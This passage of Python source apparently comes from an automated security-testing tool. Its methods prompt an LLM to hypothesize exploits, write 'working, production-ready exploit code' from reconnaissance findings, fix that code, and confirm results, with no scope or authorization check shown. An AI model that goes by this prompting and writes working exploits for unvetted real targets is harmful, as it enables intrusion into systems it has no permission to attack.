            self.logger.error(f"Failed to analyze and hypothesize exploits: {e}")
            return []
    
    async def generate_exploit_code(self, hypothesis: dict, recon_findings: dict) -> dict:
        """Generate exploit code based on hypothesis"""
        try:
            prompt = f"""Generate exploit code for this hypothesis:

Hypothesis:
{json.dumps(hypothesis, indent=2)}

Reconnaissance Findings:
{json.dumps(recon_findings, indent=2)}

Provide a JSON response with:
- code: the exploit code
- language: programming language
- dependencies: required libraries
- usage: how to run the exploit
- notes: important notes

Response format: {{"code": "...", "language": "...", "dependencies": [...], "usage": "...", "notes": "..."}}"""

            messages = [
                {"role": "system", "content": "You are an expert exploit developer. Generate working, production-ready exploit code."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages, max_tokens=50000)
            return self.extract_and_parse_json(response, "exploit_code")

        except Exception as e:
            self.logger.error(f"Failed to generate exploit code: {e}")
            return {}
    
    async def correct_python_code(self, code: str, error: str) -> str:
        """Correct Python code based on error"""
        try:
            prompt = f"""Fix this Python code:

Code:
```python
{code}
```

Error:
{error}

Provide only the corrected Python code without explanation."""

            messages = [
                {"role": "system", "content": "You are an expert Python developer. Fix the code and return only the corrected code."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)

            # Extract code from markdown if present
            if "```python" in response:
                code_match = re.search(r'```python\n(.*?)\n```', response, re.DOTALL)
                if code_match:
                    return code_match.group(1)
            elif "```" in response:
                code_match = re.search(r'```\n(.*?)\n```', response, re.DOTALL)
                if code_match:
                    return code_match.group(1)

            return response

        except Exception as e:
            self.logger.error(f"Failed to correct Python code: {e}")
            return code
    
    async def generate_test_sequence(self, test_plan: list, context: dict) -> list:
        """Generate test sequence based on test plan"""
        try:
            prompt = f"""Generate a test sequence for this test plan:

Test Plan:
{json.dumps(test_plan, indent=2)}

Context:
{json.dumps(context, indent=2)}

Provide a JSON array of test steps with:
- step_number: sequential number
- action: what to do
- expected_result: what should happen
- validation: how to validate success

Response format: [{{"step_number": 1, "action": "...", "expected_result": "...", "validation": "..."}}, ...]"""

            messages = [
                {"role": "system", "content": "You are an expert test engineer."},
                {"role": "user", "content": prompt}
            ]
            
            response = await self._call_vanchin_api(messages)
            sequence = self.extract_and_parse_json(response, "test_sequence")
            
            if isinstance(sequence, list):
                return sequence
            return []
            
        except Exception as e:
            self.logger.error(f"Failed to generate test sequence: {e}")
            return []
    
    async def confirm_hypothesis(self, final_response: dict, hypothesis: dict) -> dict:
        """Confirm if hypothesis was validated"""
        try:
            prompt = f"""Confirm if this hypothesis was validated:

Hypothesis:
{json.dumps(hypothesis, indent=2)}

Final Response:
{json.dumps(final_response, indent=2)}

Provide a JSON response with:
- confirmed: true/false
- confidence: high/medium/low
- reason: explanation

Response format: {{"confirmed": true/false, "confidence": "...", "reason": "..."}}"""

            messages = [
                {"role": "system", "content": "You are an expert security analyst."},
                {"role": "user", "content": prompt}
            ]

            response = await self._call_vanchin_api(messages)
            confirmation = self.extract_and_parse_json(response, "hypothesis_confirmation")

            if isinstance(confirmation, dict) and 'confirmed' in confirmation:
                return confirmation

            return {"confirmed": False, "reason": "Invalid confirmation format"}

        except Exception as e:
            self.logger.error(f"Failed to confirm hypothesis: {e}")
            return {"confirmed": False, "reason": f"Exception: {e}"}
    
    def extract_and_parse_json(self, text: str, context: str = "unknown") -> dict:
        """Extract and parse JSON from text response"""
        try:
            # Try direct JSON parse
            return json.loads(text)
        except json.JSONDecodeError:
            # Try to extract JSON from markdown code blocks
            json_match = re.search(r'```json\n(.*?)\n```', text, re.DOTALL)
            if json_match:
                try:
                    return json.loads(json_match.group(1))
                except json.JSONDecodeError:
                    pass
            
            # Try to find JSON object in text
            json_match = re.search(r'\{.*\}', text, re.DOTALL)
            if json_match:
                try:
                    return json.loads(json_match.group(0))
                except json.JSONDecodeError:
                    pass
            
            # Try to find JSON array in text
            json_match = re.search(r'\[.*\]', text, re.DOTALL)
            if json_match:
                try:
                    return json.loads(json_match.group(0))
                except json.JSONDecodeError:
                    pass
            
            self.logger.warning(f"Failed to extract JSON from {context}: {text[:200]}")
            return {}

